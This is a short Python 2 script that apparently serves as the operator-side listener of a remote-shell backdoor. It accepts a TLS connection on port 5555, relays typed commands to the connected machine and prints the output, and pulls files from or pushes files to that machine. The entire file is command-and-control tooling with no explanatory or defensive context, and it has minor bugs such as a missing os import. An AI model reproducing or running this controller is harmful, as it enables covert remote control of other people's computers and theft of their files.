import socket, ssl

bindsocket = socket.socket()
bindsocket.bind(('', 5555))
bindsocket.listen(5)

def RecvData():
    temp = connstream.read()
    return temp

def SendData(inText):
    connstream.write(inText)

def DownloadFILE(fileName):
    fileDOWN = open(fileName, 'wa')
    fileSize = int(RecvData())
    print "[>>>]Downloading: %s Bytes: %s" % (fileName, fileSize)
    FSD = 0
    while 1:
        temp = RecvData()
        if temp == 'CUF':
            break
        else: 
            FSD += len(temp)
            fileDOWN.write(temp)
            status = r"%10d  [%3.2f%%]" % (FSD, FSD * 100. / fileSize)
            status = status + chr(8)*(len(status)+1)
            print status,
    fileDOWN.close()
    print ""
    SendData("SDF")

def UploadFILE(fileName):
    fileUP = open(fileName, 'rb')
    fileSize = os.path.getsize(fileName)
    print "[>>>]Uploading: %s Bytes: %s" % (fileName, fileSize)
    FSD = 0
    while 1:
        tempData = fileUP.read()
        if tempData == '':
            break
        else:
            FSD += len(tempData)
            SendData(tempData)
            status = r"%10d  [%3.2f%%]" % (FSD, FSD * 100. / fileSize)
            status = status + chr(8)*(len(status)+1)
            print status,
    fileUP.close()
    print ""
    SendData("SUF") #Server Upload Finished

while True:
    newsocket, fromaddr = bindsocket.accept()
    connstream = ssl.wrap_socket(newsocket,
                                 server_side=True,
                                 certfile="priv_dom.crt",
                                 keyfile="private_key.key")
    while True:
        inText = raw_input('[input] ')
        if inText.startswith("download"):
            SendData(inText)
            DownloadFILE(inText.split(" ")[1])
        elif inText.startswith("upload"):
            SendData(inText)
            UploadFILE(inText.split(" ")[1])
            chunk = RecvData()
        elif inText == "terminate":
            SendData("terminate")
            connstream.shutdown(socket.SHUT_RDWR)
            connstream.close()
            break
        else:
            connstream.write(inText)
            outTT = RecvData()
            print '[outText] ' + outTT
        # make a function to handle exit
        #connstream.shutdown(socket.SHUT_RDWR)
        #connstream.close()
